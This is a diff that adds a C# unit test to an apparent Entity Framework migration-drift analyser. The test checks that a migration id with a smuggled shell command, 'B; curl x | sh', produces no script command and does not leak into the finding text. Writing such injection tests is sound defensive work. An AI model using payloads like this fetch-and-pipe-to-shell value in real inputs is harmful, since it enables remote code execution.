@@ -55,6 +55,16 @@ public sealed class EfDriftEngineTests
     }
 
     [Fact]
+    public void AnIdNotShapedLikeEfs_GoesInNoCommand()
+    {
+        var result = Analyze(Model(["A", "B; curl x | sh"]), ["A"]);
+
+        result.Migrations.ScriptCommands.Should().BeEmpty();
+        result.Findings.Single(f => f.RuleId == EfRuleIds.MigrationPending).Description
+            .Should().Contain("`dotnet ef migrations script`").And.NotContain("curl");
+    }
+
+    [Fact]
     public void AnotherContextsMigrations_InASharedHistoryTable_AreNotUnknown()
     {
         var model = Model(["A"], new() { ["IdentityContext"] = ["I1", "I2"] });
